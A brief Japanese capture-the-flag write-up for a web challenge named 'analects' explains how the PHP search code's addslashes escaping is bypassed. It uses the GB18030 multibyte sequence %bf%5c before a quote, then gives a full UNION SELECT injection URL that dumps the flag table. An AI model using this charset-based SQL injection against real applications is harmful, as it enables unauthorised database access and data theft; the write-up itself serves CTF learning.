# analects

initファイルを見ているとflagがflagテーブルに流されることがわかる

```sh
#!/bin/bash

cd /docker-entrypoint-initdb.d

if [ -f flag.txt ]; then
  read flag < flag.txt
  mysql -u root -p"$MYSQL_ROOT_PASSWORD" analects -e "UPDATE flag SET flag='$flag';"
fi
```

ソースコードを見るとSQLi出来そうな箇所が見つかる
```php
$query = addslashes($_GET["q"]);
$sql = "SELECT * FROM analects WHERE chinese LIKE '%{$query}%' OR english LIKE '%{$query}%'";
$result = $db->query($sql);
```
しかしaddslashes関数が入っているため処理が必要そう

どうやら文字コードがGB18030らしく、addslashesをすり抜けることができる

%bf%5c'でシングルクオートをバイパス、その後unionでクエリを書いて%23で#?コメントアウトしておしまい

`https://analects.tjc.tf/search.php?q=%61%bf%5c'union select 1,1,1,1,1,flag from flag%23`
